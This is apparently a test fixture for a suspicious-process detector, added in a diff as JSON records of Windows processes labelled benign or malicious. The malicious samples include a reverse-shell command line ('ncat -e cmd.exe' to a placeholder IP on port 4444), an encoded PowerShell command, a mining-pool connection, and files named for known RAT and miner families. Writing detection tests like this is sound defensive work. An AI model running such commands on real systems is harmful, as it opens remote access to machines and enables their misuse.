@@ -1,0 +1,143 @@
+[
+  {
+    "id": "benign-browser",
+    "isMalicious": false,
+    "process": {
+      "pid": 1001,
+      "name": "browser",
+      "filePath": "C:\\Program Files\\Browser\\browser.exe",
+      "isSigned": true,
+      "hasWindow": true,
+      "memoryMB": 740
+    }
+  },
+  {
+    "id": "benign-high-memory-game",
+    "isMalicious": false,
+    "process": {
+      "pid": 1002,
+      "name": "game",
+      "filePath": "D:\\Games\\game.exe",
+      "isSigned": true,
+      "hasWindow": true,
+      "memoryMB": 3000
+    }
+  },
+  {
+    "id": "malicious-miner-command",
+    "isMalicious": true,
+    "process": {
+      "pid": 1003,
+      "name": "worker",
+      "filePath": "C:\\Users\\Public\\worker.exe",
+      "commandLine": "worker --stratum stratum+tcp://pool.invalid",
+      "isSigned": false
+    }
+  },
+  {
+    "id": "malicious-encoded-credential-command",
+    "isMalicious": true,
+    "process": {
+      "pid": 1004,
+      "name": "powershell",
+      "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "commandLine": "powershell -encodedcommand AAA frombase64string",
+      "isSigned": true
+    }
+  },
+  {
+    "id": "benign-signed-temp-updater",
+    "isMalicious": false,
+    "process": {
+      "pid": 1005,
+      "name": "vendorupdater",
+      "filePath": "C:\\Users\\Test\\AppData\\Local\\Temp\\vendorupdater.exe",
+      "isSigned": true,
+      "companyName": "Example Vendor",
+      "hasWindow": false,
+      "cpuPercent": 4
+    }
+  },
+  {
+    "id": "benign-unsigned-developer-tool",
+    "isMalicious": false,
+    "process": {
+      "pid": 1006,
+      "name": "localcompiler",
+      "filePath": "C:\\Users\\Test\\Downloads\\localcompiler.exe",
+      "isSigned": false,
+      "hasWindow": true,
+      "memoryMB": 240
+    }
+  },
+  {
+    "id": "benign-background-render",
+    "isMalicious": false,
+    "process": {
+      "pid": 1007,
+      "name": "renderer",
+      "filePath": "C:\\Program Files\\Renderer\\renderer.exe",
+      "isSigned": true,
+      "hasWindow": false,
+      "cpuPercent": 62,
+      "memoryMB": 1800
+    }
+  },
+  {
+    "id": "benign-administration-script",
+    "isMalicious": false,
+    "process": {
+      "pid": 1008,
+      "name": "powershell",
+      "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "commandLine": "powershell -File C:\\Admin\\inventory.ps1",
+      "isSigned": true,
+      "hasWindow": true
+    }
+  },
+  {
+    "id": "malicious-known-rat-from-temp",
+    "isMalicious": true,
+    "process": {
+      "pid": 1009,
+      "name": "asyncrat",
+      "filePath": "C:\\Users\\Test\\AppData\\Local\\Temp\\asyncrat.exe",
+      "isSigned": false,
+      "hasWindow": false
+    }
+  },
+  {
+    "id": "malicious-system-name-impersonation",
+    "isMalicious": true,
+    "process": {
+      "pid": 1010,
+      "name": "svchost-update",
+      "filePath": "C:\\Users\\Public\\svchost-update.exe",
+      "isSigned": false,
+      "hasWindow": false
+    }
+  },
+  {
+    "id": "malicious-reverse-shell-command",
+    "isMalicious": true,
+    "process": {
+      "pid": 1011,
+      "name": "utility",
+      "filePath": "C:\\ProgramData\\utility.exe",
+      "commandLine": "utility ncat -e cmd.exe 203.0.113.2 4444",
+      "isSigned": false,
+      "hasWindow": false
+    }
+  },
+  {
+    "id": "malicious-miner-family-name",
+    "isMalicious": true,
+    "process": {
+      "pid": 1012,
+      "name": "xmrig-worker",
+      "filePath": "C:\\Users\\Test\\AppData\\Roaming\\xmrig-worker.exe",
+      "isSigned": false,
+      "hasWindow": false
+    }
+  }
+]
